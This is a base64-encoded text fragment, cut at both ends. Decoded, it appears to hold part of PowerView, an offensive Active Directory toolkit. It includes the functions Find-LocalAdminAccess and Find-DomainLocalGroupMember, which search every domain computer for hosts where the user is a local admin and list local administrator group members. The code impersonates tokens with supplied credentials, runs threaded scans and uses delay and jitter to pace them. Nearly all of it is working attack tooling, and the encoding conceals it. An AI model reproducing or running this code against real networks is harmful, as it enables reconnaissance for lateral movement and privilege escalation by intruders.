GEgc3BlY2lmaWMgb3BlcmF0aW5nIHN5c3RlbSwgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlclNlcnZpY2VQYWNrCgpTZWFyY2ggY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBzZXJ2aWNlIHBhY2ssIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgQ29tcHV0ZXJTaXRlTmFtZQoKU2VhcmNoIGNvbXB1dGVycyBpbiB0aGUgc3BlY2lmaWMgQUQgU2l0ZSBuYW1lLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIENoZWNrU2hhcmVBY2Nlc3MKClN3aXRjaC4gT25seSBkaXNwbGF5IGZvdW5kIHNoYXJlcyB0aGF0IHRoZSBsb2NhbCB1c2VyIGhhcyBhY2Nlc3MgdG8uCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyIGZvciBjb21wdXRlcnMsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4gYW5kIHRhcmdldCBzeXN0ZW1zLgoKLlBBUkFNRVRFUiBEZWxheQoKU3BlY2lmaWVzIHRoZSBkZWxheSAoaW4gc2Vjb25kcykgYmV0d2VlbiBlbnVtZXJhdGluZyBob3N0cywgZGVmYXVsdHMgdG8gMC4KCi5QQVJBTUVURVIgSml0dGVyCgpTcGVjaWZpZXMgdGhlIGppdHRlciAoMC0xLjApIHRvIGFwcGx5IHRvIGFueSBzcGVjaWZpZWQgLURlbGF5LCBkZWZhdWx0cyB0byArLy0gMC4zCgouUEFSQU1FVEVSIFRocmVhZHMKClRoZSBudW1iZXIgb2YgdGhyZWFkcyB0byB1c2UgZm9yIHVzZXIgc2VhcmNoaW5nLCBkZWZhdWx0cyB0byAyMC4KCi5FWEFNUExFCgpGaW5kLUxvY2FsQWRtaW5BY2Nlc3MKCkZpbmRzIG1hY2hpbmVzIGluIHRoZSBjdXJyZW50IGRvbWFpbiB0aGUgY3VycmVudCB1c2VyIGhhcyBhZG1pbiBhY2Nlc3MgdG8uCgouRVhBTVBMRQoKRmluZC1Mb2NhbEFkbWluQWNjZXNzIC1Eb21haW4gZGV2LnRlc3RsYWIubG9jYWwKCkZpbmRzIG1hY2hpbmVzIGluIHRoZSBkZXYudGVzdGxhYi5sb2NhbCBkb21haW4gdGhlIGN1cnJlbnQgdXNlciBoYXMgYWRtaW4gYWNjZXNzIHRvLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkZpbmQtTG9jYWxBZG1pbkFjY2VzcyAtRG9tYWluIHRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQKCkZpbmRzIG1hY2hpbmVzIGluIHRoZSB0ZXN0bGFiLmxvY2FsIGRvbWFpbiB0aGF0IHRoZSB1c2VyIHdpdGggdGhlIHNwZWNpZmllZCAtQ3JlZGVudGlhbApoYXMgYWRtaW4gYWNjZXNzIHRvLgoKLk9VVFBVVFMKClN0cmluZwoKQ29tcHV0ZXIgZG5zaG9zdG5hbWVzIHRoZSBjdXJyZW50IHVzZXIgaGFzIGFkbWluaXN0cmF0aXZlIGFjY2VzcyB0by4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoW1N0cmluZ10pXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdETlNIb3N0TmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdPcGVyYXRpbmdTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck9wZXJhdGluZ1N5c3RlbSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQYWNrJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZXJ2aWNlUGFjaywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NpdGVOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTaXRlTmFtZSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQ2hlY2tTaGFyZUFjY2VzcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICREZWxheSA9IDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDAuMCwgMS4wKV0KICAgICAgICBbRG91YmxlXQogICAgICAgICRKaXR0ZXIgPSAuMywKCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnZG5zaG9zdG5hbWUnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyRG9tYWluJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckxEQVBGaWx0ZXInXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJENvbXB1dGVyTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZWFyY2hCYXNlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRDb21wdXRlclNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VuY29uc3RyYWluZWQnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snVW5jb25zdHJhaW5lZCddID0gJFVuY29uc3RyYWluZWQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyT3BlcmF0aW5nU3lzdGVtJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ09wZXJhdGluZ1N5c3RlbSddID0gJE9wZXJhdGluZ1N5c3RlbSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZXJ2aWNlUGFjayddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2aWNlUGFjayddID0gJFNlcnZpY2VQYWNrIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNpdGVOYW1lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NpdGVOYW1lJ10gPSAkU2l0ZU5hbWUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gJENvbXB1dGVyTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4nCiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgIH0KICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Mb2NhbEFkbWluQWNjZXNzXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiAkKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoKSIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLUxvY2FsQWRtaW5BY2Nlc3NdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZScKICAgICAgICB9CgogICAgICAgICMgdGhlIGhvc3QgZW51bWVyYXRpb24gYmxvY2sgd2UncmUgdXNpbmcgdG8gZW51bWVyYXRlIGFsbCBzZXJ2ZXJzCiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIFBhcmFtKCRDb21wdXRlck5hbWUsICRUb2tlbkhhbmRsZSkKCiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgICMgaW1wZXJzb25hdGUgdGhlIHRoZSB0b2tlbiBwcm9kdWNlZCBieSBMb2dvblVzZXIoKS9JbnZva2UtVXNlckltcGVyc29uYXRpb24KICAgICAgICAgICAgICAgICROdWxsID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1Ub2tlbkhhbmRsZSAkVG9rZW5IYW5kbGUgLVF1aWV0CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICBpZiAoJFVwKSB7CiAgICAgICAgICAgICAgICAgICAgIyBjaGVjayBpZiB0aGUgY3VycmVudCB1c2VyIGhhcyBsb2NhbCBhZG1pbiBhY2Nlc3MgdG8gdGhpcyBzZXJ2ZXIKICAgICAgICAgICAgICAgICAgICAkQWNjZXNzID0gVGVzdC1BZG1pbkFjY2VzcyAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgIGlmICgkQWNjZXNzLklzQWRtaW4pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFRva2VuSGFuZGxlKSB7CiAgICAgICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRMb2dvblRva2VuID0gJE51bGwKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUXVpZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAjIG9ubHkgaWdub3JlIHRocmVhZGluZyBpZiAtRGVsYXkgaXMgcGFzc2VkCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUxvY2FsQWRtaW5BY2Nlc3NdIFRvdGFsIG51bWJlciBvZiBob3N0czogJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVyIgogICAgICAgICAgICAkQ291bnRlciA9IDAKICAgICAgICAgICAgJFJhbmRObyA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRUYXJnZXRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRDb3VudGVyID0gJENvdW50ZXIgKyAxCgogICAgICAgICAgICAgICAgIyBzbGVlcCBmb3Igb3VyIHNlbWktcmFuZG9taXplZCBpbnRlcnZhbAogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQoKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUxvY2FsQWRtaW5BY2Nlc3NdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkpIgogICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Mb2NhbEFkbWluQWNjZXNzXSBVc2luZyB0aHJlYWRpbmcgd2l0aCB0aHJlYWRzOiAkVGhyZWFkcyIKCiAgICAgICAgICAgICMgaWYgd2UncmUgdXNpbmcgdGhyZWFkaW5nLCBraWNrIG9mZiB0aGUgc2NyaXB0IGJsb2NrIHdpdGggTmV3LVRocmVhZGVkRnVuY3Rpb24KICAgICAgICAgICAgJFNjcmlwdFBhcmFtcyA9IEB7CiAgICAgICAgICAgICAgICAnVG9rZW5IYW5kbGUnID0gJExvZ29uVG9rZW4KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aHJlYWRpbmcsIGtpY2sgb2ZmIHRoZSBzY3JpcHQgYmxvY2sgd2l0aCBOZXctVGhyZWFkZWRGdW5jdGlvbiB1c2luZyB0aGUgJEhvc3RFbnVtQmxvY2sgKyBwYXJhbXMKICAgICAgICAgICAgTmV3LVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXJzIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zIC1UaHJlYWRzICRUaHJlYWRzCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyIHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGVzIHRoZSBtZW1iZXJzIG9mIHNwZWNpZmllZCBsb2NhbCBncm91cCAoZGVmYXVsdCBhZG1pbmlzdHJhdG9ycykKZm9yIGFsbCB0aGUgdGFyZ2V0ZWQgbWFjaGluZXMgb24gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluQ29tcHV0ZXIsIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiwgR2V0LU5ldExvY2FsR3JvdXBNZW1iZXIsIE5ldy1UaHJlYWRlZEZ1bmN0aW9uICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiBlbnVtZXJhdGVzIGFsbCBtYWNoaW5lcyBvbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4KdXNpbmcgR2V0LURvbWFpbkNvbXB1dGVyLCBhbmQgZW51bWVyYXRlcyB0aGUgbWVtYmVycyBvZiB0aGUgc3BlY2lmaWVkIGxvY2FsCmdyb3VwIChkZWZhdWx0IG9mIEFkbWluaXN0cmF0b3JzKSBmb3IgZWFjaCBtYWNoaW5lIHVzaW5nIEdldC1OZXRMb2NhbEdyb3VwTWVtYmVyLgpCeSBkZWZhdWx0LCB0aGUgQVBJIG1ldGhvZCBpcyB1c2VkLCBidXQgdGhpcyBjYW4gYmUgbW9kaWZpZWQgd2l0aCAnLU1ldGhvZCB3aW5udCcKdG8gdXNlIHRoZSBXaW5OVCBzZXJ2aWNlIHByb3ZpZGVyLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyBhbiBhcnJheSBvZiBvbmUgb3IgbW9yZSBob3N0cyB0byBlbnVtZXJhdGUsIHBhc3NhYmxlIG9uIHRoZSBwaXBlbGluZS4KSWYgLUNvbXB1dGVyTmFtZSBpcyBub3QgcGFzc2VkLCB0aGUgZGVmYXVsdCBiZWhhdmlvciBpcyB0byBlbnVtZXJhdGUgYWxsIG1hY2hpbmVzCmluIHRoZSBkb21haW4gcmV0dXJuZWQgYnkgR2V0LURvbWFpbkNvbXB1dGVyLgoKLlBBUkFNRVRFUiBDb21wdXRlckRvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gcXVlcnkgZm9yIGNvbXB1dGVycywgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBDb21wdXRlckxEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gc2VhcmNoIGZvciBjb21wdXRlciBvYmplY3RzLgoKLlBBUkFNRVRFUiBDb21wdXRlclNlYXJjaEJhc2UKClNwZWNpZmllcyB0aGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2ggZm9yIGNvbXB1dGVycywKZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIi4gVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBDb21wdXRlck9wZXJhdGluZ1N5c3RlbQoKU2VhcmNoIGNvbXB1dGVycyB3aXRoIGEgc3BlY2lmaWMgb3BlcmF0aW5nIHN5c3RlbSwgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlclNlcnZpY2VQYWNrCgpTZWFyY2ggY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBzZXJ2aWNlIHBhY2ssIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgQ29tcHV0ZXJTaXRlTmFtZQoKU2VhcmNoIGNvbXB1dGVycyBpbiB0aGUgc3BlY2lmaWMgQUQgU2l0ZSBuYW1lLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIEdyb3VwTmFtZQoKVGhlIGxvY2FsIGdyb3VwIG5hbWUgdG8gcXVlcnkgZm9yIHVzZXJzLiBJZiBub3QgZ2l2ZW4sIGl0IGRlZmF1bHRzIHRvICJBZG1pbmlzdHJhdG9ycyIuCgouUEFSQU1FVEVSIE1ldGhvZAoKVGhlIGNvbGxlY3Rpb24gbWV0aG9kIHRvIHVzZSwgZGVmYXVsdHMgdG8gJ0FQSScsIGFsc28gYWNjZXB0cyAnV2luTlQnLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciBmb3IgY29tcHV0ZXJzLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluIGFuZCB0YXJnZXQgc3lzdGVtcy4KCi5QQVJBTUVURVIgRGVsYXkKClNwZWNpZmllcyB0aGUgZGVsYXkgKGluIHNlY29uZHMpIGJldHdlZW4gZW51bWVyYXRpbmcgaG9zdHMsIGRlZmF1bHRzIHRvIDAuCgouUEFSQU1FVEVSIEppdHRlcgoKU3BlY2lmaWVzIHRoZSBqaXR0ZXIgKDAtMS4wKSB0byBhcHBseSB0byBhbnkgc3BlY2lmaWVkIC1EZWxheSwgZGVmYXVsdHMgdG8gKy8tIDAuMwoKLlBBUkFNRVRFUiBUaHJlYWRzCgpUaGUgbnVtYmVyIG9mIHRocmVhZHMgdG8gdXNlIGZvciB1c2VyIHNlYXJjaGluZywgZGVmYXVsdHMgdG8gMjAuCgouRVhBTVBMRQoKRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyCgpFbnVtZXJhdGVzIHRoZSBsb2NhbCBncm91cCBtZW1iZXJzaGlwcyBmb3IgYWxsIHJlYWNoYWJsZSBtYWNoaW5lcyBpbiB0aGUgY3VycmVudCBkb21haW4uCgouRVhBTVBMRQoKRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyIC1Eb21haW4gZGV2LnRlc3RsYWIubG9jYWwKCkVudW1lcmF0ZXMgdGhlIGxvY2FsIGdyb3VwIG1lbWJlcnNoaXBzIGZvciBhbGwgcmVhY2hhYmxlIG1hY2hpbmVzIHRoZSBkZXYudGVzdGxhYi5sb2NhbCBkb21haW4uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKRmluZC1Eb21haW5Mb2NhbEdyb3V